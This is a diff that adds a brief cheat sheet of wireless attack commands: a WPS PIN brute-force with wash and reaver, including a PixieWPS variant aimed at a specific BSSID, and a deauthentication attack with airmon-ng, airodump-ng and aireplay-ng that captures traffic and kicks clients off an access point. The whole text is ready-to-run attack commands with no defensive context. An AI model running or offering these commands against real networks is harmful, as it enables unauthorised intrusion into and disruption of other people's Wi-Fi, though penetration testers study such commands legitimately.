@@ -1,0 +1,14 @@
+## WPS Attack ##
+
+  wash –i wlan0
+  reaver –b <BSSID> –i wlan0 -vv –S
+  or 
+  for PixieWPS attack you can use "-K" parameter
+  reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K
+
+## Deauthentication Attack ##
+
+airmon-ng start wlan0
+airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
+aireplay-ng -0 1 –a <BSSID> -c <client_Mac> wlan0
+
